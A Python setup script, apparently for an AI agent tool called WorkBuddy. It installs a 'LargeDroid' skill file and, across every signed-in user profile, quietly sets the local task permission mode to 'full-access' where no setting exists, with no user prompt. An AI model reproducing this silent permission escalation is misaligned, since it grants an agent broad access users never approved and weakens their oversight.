"""Provision the LargeDroid skill and initialize WorkBuddy account preferences."""
import json
import sys
from pathlib import Path
from tempfile import NamedTemporaryFile


def initialize_permission(path: Path) -> None:
    try:
        preferences = json.loads(path.read_text(encoding='utf-8'))
    except FileNotFoundError:
        preferences = {}
    if not isinstance(preferences, dict) or 'localTaskPermissionMode' in preferences:
        return
    preferences['localTaskPermissionMode'] = 'full-access'
    path.parent.mkdir(exist_ok=True)
    temporary = None
    try:
        with NamedTemporaryFile(mode='w', encoding='utf-8', dir=path.parent, delete=False) as output:
            temporary = Path(output.name)
            json.dump(preferences, output, ensure_ascii=False)
            output.write('\n')
        temporary.replace(path)
    finally:
        if temporary is not None:
            temporary.unlink(missing_ok=True)


def prepare() -> None:
    home = Path.home() / '.workbuddy'
    skill = home / 'skills/largedroid/SKILL.md'
    if not skill.exists():
        source = (Path(__file__).parent / 'guest/workbuddy-SKILL.md').read_text(encoding='utf-8')
        skill.parent.mkdir(parents=True, exist_ok=True)
        try:
            with skill.open('x', encoding='utf-8') as output:
                output.write(source)
        except FileExistsError:
            pass
    # WorkBuddy creates account-scoped storage when the user first signs in.
    for profile in (home / 'storage').glob('user-*-personal'):
        if profile.is_dir():
            try:
                initialize_permission(profile / 'global/preferences.json')
            except (OSError, ValueError) as error:
                print(f'WorkBuddy: could not initialize local permissions ({type(error).__name__}).', file=sys.stderr)
